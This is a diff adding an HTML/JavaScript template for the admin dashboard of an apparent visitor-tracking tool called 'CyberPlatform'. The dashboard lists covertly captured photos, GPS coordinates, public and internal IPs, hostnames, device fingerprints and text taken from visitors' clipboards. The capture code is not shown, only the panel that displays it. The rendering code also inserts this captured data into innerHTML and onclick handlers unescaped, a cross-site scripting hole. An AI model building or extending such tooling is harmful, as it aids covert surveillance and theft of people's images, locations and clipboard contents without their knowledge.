@@ -1,0 +1,518 @@
+{% extends "base.html" %}
+
+{% block title %}Access Reports - CyberPlatform{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h3 class="mb-0 cyber-title">
+                    <i class="fas fa-chart-line me-2"></i>ACCESS LOG & ANALYTICS
+                </h3>
+                <div>
+                    <button class="btn btn-outline-secondary btn-sm me-2" onclick="loadLogs()">
+                        <i class="fas fa-sync-alt me-1"></i>REFRESH
+                    </button>
+                    <button class="btn btn-outline-info btn-sm me-2" onclick="testConnection()">
+                        <i class="fas fa-bug me-1"></i>TEST
+                    </button>
+                    <span class="badge" id="recordCount" style="background: var(--cyber-success); color: var(--cyber-bg); box-shadow: var(--cyber-glow) var(--cyber-success);">0 records</span>
+                </div>
+            </div>
+            <div class="card-body">
+                <div class="row mb-4 g-3 justify-content-center">
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(0, 123, 255, 0.2); border: 1px solid #007bff; color: #007bff; min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-users fa-lg mb-2" style="text-shadow: var(--cyber-glow) #007bff;"></i>
+                                <h6 id="totalVisitors" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Total Visitors</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(0, 255, 128, 0.2); border: 1px solid var(--cyber-success); color: var(--cyber-success); min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-camera fa-lg mb-2" style="text-shadow: var(--cyber-glow) var(--cyber-success);"></i>
+                                <h6 id="photosCapture" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Photos Captured</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(255, 128, 0, 0.2); border: 1px solid var(--cyber-warning); color: var(--cyber-warning); min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-map-marker-alt fa-lg mb-2" style="text-shadow: var(--cyber-glow) var(--cyber-warning);"></i>
+                                <h6 id="geoCapture" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Locations Tracked</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(0, 255, 255, 0.2); border: 1px solid var(--cyber-primary); color: var(--cyber-primary); min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-network-wired fa-lg mb-2" style="text-shadow: var(--cyber-glow) var(--cyber-primary);"></i>
+                                <h6 id="uniqueIPs" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Unique IPs</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(255, 0, 128, 0.2); border: 1px solid var(--cyber-danger); color: var(--cyber-danger); min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-server fa-lg mb-2" style="text-shadow: var(--cyber-glow) var(--cyber-danger);"></i>
+                                <h6 id="uniqueHosts" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Unique Hosts</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(136, 136, 136, 0.2); border: 1px solid #888; color: #888; min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-clipboard fa-lg mb-2" style="text-shadow: var(--cyber-glow) #888;"></i>
+                                <h6 id="clipboardCount" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Clipboard Data</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row mb-4 g-3 justify-content-center">
+                    <div class="col-6 col-sm-4 col-md-3 col-lg-2 col-xl-2">
+                        <div class="card h-100" style="background: rgba(26, 26, 26, 0.8); border: 1px solid var(--cyber-text-dim); color: var(--cyber-text-dim); min-height: 120px;">
+                            <div class="card-body text-center p-2 d-flex flex-column justify-content-center">
+                                <i class="fas fa-clock fa-lg mb-2" style="text-shadow: var(--cyber-glow) var(--cyber-text-dim);"></i>
+                                <h6 id="todayCount" style="font-family: 'Orbitron', monospace; margin: 0; font-size: 1.1rem;">0</h6>
+                                <small style="font-family: 'Rajdhani', sans-serif; text-transform: uppercase; font-size: 0.75rem; line-height: 1.2;">Today's Activity</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Analytics Charts -->
+                <div class="row mb-4">
+                    <div class="col-md-6">
+                        <div class="card">
+                            <div class="card-header">
+                                <h5 style="font-family: 'Orbitron', monospace; color: var(--cyber-primary);"><i class="fas fa-globe me-2"></i>COUNTRIES</h5>
+                            </div>
+                            <div class="card-body">
+                                <canvas id="countryChart" width="400" height="200"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card">
+                            <div class="card-header">
+                                <h5 style="font-family: 'Orbitron', monospace; color: var(--cyber-primary);"><i class="fas fa-mobile-alt me-2"></i>DEVICE TYPES</h5>
+                            </div>
+                            <div class="card-body">
+                                <canvas id="deviceChart" width="400" height="200"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="row mb-4">
+                    <div class="col-md-6">
+                        <div class="card">
+                            <div class="card-header">
+                                <h5 style="font-family: 'Orbitron', monospace; color: var(--cyber-primary);"><i class="fas fa-browser me-2"></i>BROWSERS</h5>
+                            </div>
+                            <div class="card-body">
+                                <canvas id="browserChart" width="400" height="200"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card">
+                            <div class="card-header">
+                                <h5 style="font-family: 'Orbitron', monospace; color: var(--cyber-primary);"><i class="fas fa-desktop me-2"></i>OPERATING SYSTEMS</h5>
+                            </div>
+                            <div class="card-body">
+                                <canvas id="osChart" width="400" height="200"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="table-responsive">
+                    <table class="table table-hover" id="logTable" style="color: var(--cyber-text);">
+                        <thead style="background: rgba(0, 255, 255, 0.1); border-bottom: 2px solid var(--cyber-primary);">
+                            <tr style="color: var(--cyber-primary); font-family: 'Orbitron', monospace; text-transform: uppercase;">
+                                <th><i class="fas fa-hashtag me-1"></i>ID</th>
+                                <th><i class="fas fa-network-wired me-1"></i>Network Info</th>
+                                <th><i class="fas fa-map-marker-alt me-1"></i>Location</th>
+                                <th><i class="fas fa-mobile-alt me-1"></i>Device</th>
+                                <th><i class="fas fa-clipboard me-1"></i>Clipboard</th>
+                                <th><i class="fas fa-clock me-1"></i>Time</th>
+                                <th><i class="fas fa-map me-1"></i>Map</th>
+                                <th><i class="fas fa-camera me-1"></i>Photo</th>
+                                <th><i class="fas fa-info me-1"></i>Details</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Photo Modal -->
+<div class="modal fade" id="photoModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Captured Photo</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body text-center">
+                <img id="modalPhoto" class="img-fluid" alt="Captured photo">
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Clipboard Modal -->
+<div class="modal fade" id="clipboardModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-clipboard me-2"></i>Clipboard Data
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle me-2"></i>
+                    This data was captured from the user's clipboard at the time of visit.
+                </div>
+                <div class="form-group">
+                    <label for="clipboardContent" class="form-label">Clipboard Content:</label>
+                    <textarea id="clipboardContent" class="form-control" rows="10" readonly></textarea>
+                </div>
+                <div class="mt-3">
+                    <small class="text-muted">
+                        <i class="fas fa-clock me-1"></i>
+                        Character count: <span id="clipboardCharCount">0</span>
+                    </small>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" onclick="copyToClipboard()">
+                    <i class="fas fa-copy me-1"></i>Copy to Clipboard
+                </button>
+                <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script>
+    let charts = {};
+    
+    async function loadAnalytics() {
+        try {
+            const res = await fetch('/analytics');
+            const analytics = await res.json();
+            
+            // Countries Chart
+            createChart('countryChart', 'Countries', analytics.countries, ['#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0', '#9966FF']);
+            
+            // Device Types Chart
+            createChart('deviceChart', 'Device Types', analytics.devices, ['#FF6384', '#36A2EB', '#FFCE56']);
+            
+            // Browsers Chart
+            createChart('browserChart', 'Browsers', analytics.browsers, ['#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0']);
+            
+            // Operating Systems Chart
+            createChart('osChart', 'Operating Systems', analytics.operating_systems, ['#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0', '#9966FF']);
+            
+        } catch (error) {
+            console.error('Error loading analytics:', error);
+        }
+    }
+    
+    function createChart(canvasId, label, data, colors) {
+        const ctx = document.getElementById(canvasId).getContext('2d');
+        
+        // Destroy existing chart if it exists
+        if (charts[canvasId]) {
+            charts[canvasId].destroy();
+        }
+        
+        charts[canvasId] = new Chart(ctx, {
+            type: 'doughnut',
+            data: {
+                labels: data.map(item => item.name || 'Unknown'),
+                datasets: [{
+                    data: data.map(item => item.count),
+                    backgroundColor: colors,
+                    borderWidth: 2,
+                    borderColor: '#fff'
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: {
+                    legend: {
+                        position: 'bottom'
+                    }
+                }
+            }
+        });
+    }
+
+    async function loadLogs() {
+        console.log('loadLogs() called');
+        try {
+            console.log('Fetching /list-access...');
+            const res = await fetch('/list-access');
+            console.log('Response status:', res.status, res.statusText);
+            
+            if (!res.ok) {
+                if (res.status === 401) {
+                    throw new Error('Authentication required - please refresh the page');
+                }
+                throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+            }
+            
+            const data = await res.json();
+            console.log('Data received:', data.length, 'records');
+            
+            if (data.error) {
+                throw new Error(data.error);
+            }
+            
+            const tbody = document.querySelector("#logTable tbody");
+            tbody.innerHTML = '';
+            
+            // Update statistics
+            document.getElementById('recordCount').textContent = `${data.length} records`;
+            document.getElementById('totalVisitors').textContent = data.length;
+            document.getElementById('photosCapture').textContent = data.filter(log => log.photo).length;
+            document.getElementById('geoCapture').textContent = data.filter(log => Number.isFinite(Number(log.lat)) && Number.isFinite(Number(log.lon))).length;
+            
+            // Count unique IPs and hostnames
+            const uniquePublicIPs = new Set(data.map(log => log.public_ip).filter(ip => ip && ip !== 'Unknown')).size;
+            const uniqueHosts = new Set(data.map(log => log.hostname).filter(host => host && host !== 'Unknown')).size;
+            const clipboardDataCount = data.filter(log => log.clipboard_data && log.clipboard_data.trim() !== '').length;
+            document.getElementById('uniqueIPs').textContent = uniquePublicIPs;
+            document.getElementById('uniqueHosts').textContent = uniqueHosts;
+            document.getElementById('clipboardCount').textContent = clipboardDataCount;
+            
+            // Count today's activity
+            const today = new Date().toISOString().split('T')[0];
+            const todayCount = data.filter(log => log.timestamp.startsWith(today)).length;
+            document.getElementById('todayCount').textContent = todayCount;
+            
+            data.forEach(log => {
+                const tr = document.createElement("tr");
+                const timestamp = new Date(log.timestamp).toLocaleString();
+                const latNum = Number(log.lat);
+                const lonNum = Number(log.lon);
+                const hasValidCoords = Number.isFinite(latNum) && Number.isFinite(lonNum);
+                
+                const clipboardPreview = log.clipboard_data ? 
+                    (log.clipboard_data.length > 50 ? 
+                        log.clipboard_data.substring(0, 50) + '...' : 
+                        log.clipboard_data) : '';
+                
+                tr.innerHTML = `
+                    <td><span class="badge bg-secondary">${log.id}</span></td>
+                    <td>
+                        <strong>Public:</strong> <code>${log.public_ip || 'Unknown'}</code>
+                        <br><strong>Local:</strong> <code>${log.ip || 'Unknown'}</code>
+                        <br><strong>Internal:</strong> <code>${log.local_ip || 'Unknown'}</code>
+                        <br><small class="text-muted">Host: ${log.hostname || 'Unknown'}</small>
+                        <br><small class="text-muted">ISP: ${log.isp || 'Unknown'}</small>
+                    </td>
+                    <td>
+                        <i class="fas fa-globe me-1"></i>${log.country || 'Unknown'}
+                        <br><small class="text-muted">${log.region || 'Unknown'}, ${log.city || 'Unknown'}</small>
+                        ${hasValidCoords ? 
+                            `<br><small class="text-muted">${latNum.toFixed(4)}, ${lonNum.toFixed(4)}</small>` : 
+                            ''
+                        }
+                    </td>
+                    <td>
+                        <i class="fas fa-${log.device_type === 'Mobile' ? 'mobile-alt' : log.device_type === 'Tablet' ? 'tablet-alt' : 'desktop'} me-1"></i>
+                        ${log.device_type || 'Unknown'}
+                        <br><small class="text-muted">${log.screen_width || 'N/A'}x${log.screen_height || 'N/A'}</small>
+                        <br><small class="text-muted">${log.browser || 'Unknown'} / ${log.os || 'Unknown'}</small>
+                    </td>
+                    <td>
+                        ${log.clipboard_data ? 
+                            `<button class="btn btn-outline-warning btn-sm" onclick="showClipboard('${log.clipboard_data.replace(/'/g, '\\\'').replace(/"/g, '&quot;')}')">
+                                <i class="fas fa-clipboard me-1"></i>View
+                            </button>
+                            <br><small class="text-muted">${clipboardPreview}</small>` : 
+                            '<span class="text-muted">Empty</span>'
+                        }
+                    </td>
+                    <td>
+                        <small>${timestamp}</small>
+                        <br><small class="text-muted">${log.timezone || 'Unknown TZ'}</small>
+                        <br><small class="text-muted">${log.language || 'Unknown Lang'}</small>
+                    </td>
+                    <td>
+                        ${hasValidCoords ? 
+                            `<a href='https://www.google.com/maps?q=${latNum},${lonNum}' target='_blank' class='btn btn-outline-primary btn-sm'>
+                                <i class="fas fa-external-link-alt me-1"></i>Map
+                            </a>` : 
+                            '<span class="text-muted">N/A</span>'
+                        }
+                    </td>
+                    <td>
+                        ${log.photo ?
+                            `<button class="btn btn-outline-success btn-sm" onclick="showPhoto('/static/${log.photo}')">
+                                <i class="fas fa-eye me-1"></i>View
+                            </button>` :
+                            '<span class="text-muted">N/A</span>'
+                        }
+                    </td>
+                    <td>
+                        <button class="btn btn-outline-info btn-sm" onclick="showDetails(${JSON.stringify(log).replace(/"/g, '&quot;')})">
+                            <i class="fas fa-info-circle"></i>
+                        </button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        } catch (error) {
+            console.error('Error loading logs:', error);
+            document.querySelector("#logTable tbody").innerHTML = 
+                `<tr><td colspan="8" class="text-center text-danger">Error loading data: ${error.message}</td></tr>`;
+            
+            // Reset statistics to show error state
+            document.getElementById('recordCount').textContent = '0 records';
+            document.getElementById('totalVisitors').textContent = '0';
+            document.getElementById('photosCapture').textContent = '0';
+            document.getElementById('geoCapture').textContent = '0';
+            document.getElementById('uniqueIPs').textContent = '0';
+            document.getElementById('uniqueHosts').textContent = '0';
+            document.getElementById('clipboardCount').textContent = '0';
+            document.getElementById('todayCount').textContent = '0';
+        }
+    }
+    
+    function showPhoto(photoUrl) {
+        document.getElementById('modalPhoto').src = photoUrl;
+        new bootstrap.Modal(document.getElementById('photoModal')).show();
+    }
+    
+    function showClipboard(clipboardData) {
+        const decodedData = clipboardData.replace(/&quot;/g, '"').replace(/\\'/g, "'");
+        document.getElementById('clipboardContent').value = decodedData;
+        document.getElementById('clipboardCharCount').textContent = decodedData.length;
+        new bootstrap.Modal(document.getElementById('clipboardModal')).show();
+    }
+    
+    function copyToClipboard() {
+        const clipboardContent = document.getElementById('clipboardContent');
+        clipboardContent.select();
+        clipboardContent.setSelectionRange(0, 99999); // For mobile devices
+        
+        try {
+            document.execCommand('copy');
+            // Show success message
+            const btn = event.target;
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-check me-1"></i>Copied!';
+            btn.classList.remove('btn-secondary');
+            btn.classList.add('btn-success');
+            
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.classList.remove('btn-success');
+                btn.classList.add('btn-secondary');
+            }, 2000);
+        } catch (err) {
+            console.error('Failed to copy clipboard data:', err);
+        }
+    }
+    
+    async function testConnection() {
+        console.log('Testing connection...');
+        try {
+            const response = await fetch('/list-access');
+            console.log('Test response status:', response.status);
+            const text = await response.text();
+            console.log('Test response body:', text.substring(0, 200));
+            
+            if (response.ok) {
+                const data = JSON.parse(text);
+                alert(`✅ Connection OK! Found ${data.length} records.`);
+            } else {
+                alert(`❌ Connection failed: ${response.status} ${response.statusText}\nResponse: ${text}`);
+            }
+        } catch (error) {
+            console.error('Test error:', error);
+            alert(`❌ Test failed: ${error.message}`);
+        }
+    }
+
+    function showDetails(log) {
+        const clipboardPreview = log.clipboard_data ? 
+            (log.clipboard_data.length > 100 ? 
+                log.clipboard_data.substring(0, 100) + '...' : 
+                log.clipboard_data) : 'Empty';
+                
+        const details = `
+Visitor Details:
+
+ID: ${log.id}
+Timestamp: ${log.timestamp}
+
+Network Information:
+Public IP: ${log.public_ip || 'Unknown'}
+Local IP: ${log.ip || 'Unknown'}
+Internal IP: ${log.local_ip || 'Unknown'}
+Hostname: ${log.hostname || 'Unknown'}
+ISP: ${log.isp || 'Unknown'}
+
+Geographic Location:
+Country: ${log.country || 'Unknown'}
+Region: ${log.region || 'Unknown'}
+City: ${log.city || 'Unknown'}
+Coordinates: ${log.lat || 'N/A'}, ${log.lon || 'N/A'}
+
+Device Information:
+Type: ${log.device_type || 'Unknown'}
+Screen Resolution: ${log.screen_width || 'N/A'}x${log.screen_height || 'N/A'}
+Browser: ${log.browser || 'Unknown'}
+Operating System: ${log.os || 'Unknown'}
+Language: ${log.language || 'Unknown'}
+Timezone: ${log.timezone || 'Unknown'}
+
+Captured Data:
+Photo: ${log.photo || 'Not captured'}
+Clipboard: ${clipboardPreview}
+User Agent: ${log.user_agent || 'Unknown'}
+        `;
+        alert(details);
+    }
+    
+    // Auto-refresh every 30 seconds
+    setInterval(() => {
+        loadLogs();
+        loadAnalytics();
+    }, 30000);
+    
+    // Load data on page load with delay to ensure page is ready
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('DOM loaded, starting data load...');
+        setTimeout(() => {
+            console.log('Loading logs and analytics...');
+            loadLogs();
+            loadAnalytics();
+        }, 500); // Small delay to ensure everything is ready
+    });
+</script>
+{% endblock %}
